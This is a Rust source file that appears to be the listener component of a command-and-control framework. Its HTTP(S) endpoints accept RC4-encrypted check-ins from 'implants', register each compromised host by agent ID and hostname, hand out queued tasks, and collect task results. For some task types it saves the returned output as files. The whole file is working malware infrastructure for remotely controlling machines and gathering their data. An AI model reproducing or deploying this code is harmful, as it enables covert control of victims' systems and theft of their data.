use crate::config::ListenerConfig;
use crate::core::events::Event;
use crate::protocol::{crypto, wire};
use crate::state::AppState;
use axum::{
    body::Bytes,
    extract::State,
    http::StatusCode,
    response::IntoResponse,
    routing::post,
    Router,
};
use std::net::SocketAddr;
use tracing::{error, info, warn};

pub fn build_listener_router(state: AppState, config: &ListenerConfig) -> Router {
    let rc4_key = config.rc4_key_bytes().expect("invalid rc4_key");
    let listener_id = format!("https://{}:{}", config.bind, config.port);

    let beacon_state = BeaconState {
        app: state.clone(),
        rc4_key: rc4_key.clone(),
        listener_id: listener_id.clone(),
    };
    let result_state = ResultState {
        app: state,
        rc4_key,
    };

    Router::new()
        .route(
            &config.beacon_path,
            post(handle_beacon).with_state(beacon_state),
        )
        .route(
            &config.result_path,
            post(handle_result).with_state(result_state),
        )
}

#[derive(Clone)]
struct BeaconState {
    app: AppState,
    rc4_key: Vec<u8>,
    listener_id: String,
}

#[derive(Clone)]
struct ResultState {
    app: AppState,
    rc4_key: Vec<u8>,
}

async fn handle_beacon(
    State(state): State<BeaconState>,
    body: Bytes,
) -> impl IntoResponse {
    if body.is_empty() {
        return (StatusCode::BAD_REQUEST, Bytes::new());
    }

    let plaintext = crypto::decrypt(&body, &state.rc4_key);

    let checkin = match wire::parse_checkin(&plaintext) {
        Ok(c) => c,
        Err(e) => {
            warn!("bad checkin: {}", e);
            return (StatusCode::BAD_REQUEST, Bytes::new());
        }
    };

    let addr_str = "";
    let agent_hex = hex::encode(checkin.agent_id);
    match state.app.implants.handle_checkin(
        &checkin.agent_id,
        &checkin.hostname,
        checkin.sleep_ms,
        addr_str,
        &state.listener_id,
    ) {
        Ok(is_new) => {
            if is_new {
                info!("new implant: {} ({})", agent_hex, checkin.hostname);
                state.app.events.publish(
                    Event::new("implant_new", &format!("{} ({})", agent_hex, checkin.hostname))
                        .with_agent(&agent_hex),
                );
            } else {
                state.app.events.publish(
                    Event::new("implant_checkin", &checkin.hostname)
                        .with_agent(&agent_hex),
                );
            }
        }
        Err(e) => {
            error!("checkin db error: {}", e);
            return (StatusCode::INTERNAL_SERVER_ERROR, Bytes::new());
        }
    }

    let tasks = match state.app.tasks.drain_for_implant(&checkin.agent_id) {
        Ok(t) => t,
        Err(e) => {
            error!("drain tasks error: {}", e);
            Vec::new()
        }
    };

    let task_list = wire::serialize_task_list(&tasks);
    let encrypted = crypto::encrypt(&task_list, &state.rc4_key);

    (StatusCode::OK, Bytes::from(encrypted))
}

async fn handle_result(
    State(state): State<ResultState>,
    body: Bytes,
) -> impl IntoResponse {
    if body.is_empty() {
        return StatusCode::BAD_REQUEST;
    }

    let plaintext = crypto::decrypt(&body, &state.rc4_key);

    let result = match wire::parse_result(&plaintext) {
        Ok(r) => r,
        Err(e) => {
            warn!("bad result: {}", e);
            return StatusCode::BAD_REQUEST;
        }
    };

    let agent_hex = hex::encode(result.agent_id);
    match state.app.tasks.complete(
        result.task_id as i64,
        result.success,
        &result.output,
    ) {
        Ok(true) => {
            info!(
                "task {} completed (success={})",
                result.task_id, result.success
            );
            state.app.events.publish(
                Event::new(
                    "task_complete",
                    &format!("success={}", result.success),
                )
                .with_agent(&agent_hex)
                .with_task(result.task_id as i64),
            );
        }
        Ok(false) => {
            warn!("task {} not found", result.task_id);
        }
        Err(e) => {
            error!("complete task error: {}", e);
            return StatusCode::INTERNAL_SERVER_ERROR;
        }
    }

    if result.success && !result.output.is_empty() {
        if let Ok(Some(task)) = state.app.db.get_task(result.task_id as i64) {
            if matches!(task.task_type, 4 | 5 | 6) {
                let _ = state
                    .app
                    .files
                    .store_task_output(&result.agent_id, task.task_type, &result.output);
            }
        }
    }

    let _ = state.app.db.log_event(
        "task_complete",
        Some(&result.agent_id),
        Some(result.task_id as i64),
        &format!("success={}", result.success),
    );

    StatusCode::OK
}

pub async fn start_listener(
    state: AppState,
    config: ListenerConfig,
) -> Result<(), String> {
    let router = build_listener_router(state, &config);
    let addr: SocketAddr = format!("{}:{}", config.bind, config.port)
        .parse()
        .map_err(|e| format!("invalid bind address: {}", e))?;

    if !config.tls_cert.is_empty() && !config.tls_key.is_empty() {
        let tls_config = axum_server::tls_rustls::RustlsConfig::from_pem_file(
            &config.tls_cert,
            &config.tls_key,
        )
        .await
        .map_err(|e| format!("TLS config error: {}", e))?;

        info!("HTTPS listener on {} (TLS)", addr);
        axum_server::bind_rustls(addr, tls_config)
            .serve(router.into_make_service_with_connect_info::<SocketAddr>())
            .await
            .map_err(|e| format!("listener error: {}", e))
    } else {
        info!("HTTP listener on {} (no TLS — dev mode)", addr);
        let listener = tokio::net::TcpListener::bind(addr)
            .await
            .map_err(|e| format!("bind error: {}", e))?;
        axum::serve(listener, router.into_make_service_with_connect_info::<SocketAddr>())
            .await
            .map_err(|e| format!("listener error: {}", e))
    }
}
